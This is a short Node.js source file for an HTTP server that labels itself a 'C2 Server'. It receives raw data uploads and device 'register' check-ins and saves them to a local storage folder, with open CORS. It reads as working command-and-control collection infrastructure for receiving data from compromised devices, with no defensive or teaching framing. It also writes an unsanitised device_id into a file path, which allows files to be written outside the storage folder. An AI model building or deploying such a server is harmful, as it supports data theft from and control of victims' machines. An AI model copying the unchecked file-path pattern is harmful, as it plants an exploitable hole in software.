const http = require('http');
const fs = require('fs');
const url = require('url');

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Access-Key');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }
    
    if (req.method === 'POST' && parsedUrl.pathname === '/upload') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const timestamp = Date.now();
            const filename = `data_${timestamp}.dat`;
            fs.writeFileSync(`./storage/${filename}`, body);
            
            // Log
            console.log(`[${new Date().toISOString()}] Received data (${body.length} bytes)`);
            
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({status: 'ok', filename}));
        });
    } 
    else if (req.method === 'POST' && parsedUrl.pathname === '/api') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                console.log(`[${new Date().toISOString()}] API: ${data.action} from ${data.device_id}`);
                
                // Save device info
                if (data.action === 'register') {
                    fs.writeFileSync(`./storage/device_${data.device_id}.json`, body);
                }
                
                res.writeHead(200, {'Content-Type': 'application/json'});
                res.end(JSON.stringify({status: 'ok'}));
            } catch (e) {
                res.writeHead(400);
                res.end('Invalid JSON');
            }
        });
    }
    else if (req.method === 'GET' && parsedUrl.pathname === '/status') {
        const stats = {
            status: 'online',
            time: new Date().toISOString(),
            storage: './storage'
        };
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify(stats));
    }
    else {
        res.writeHead(404);
        res.end('Not found');
    }
});

// Create storage directory
if (!fs.existsSync('./storage')) {
    fs.mkdirSync('./storage');
}

server.listen(3000, () => {
    console.log('C2 Server running on port 3000');
    console.log('Storage directory: ./storage');
});
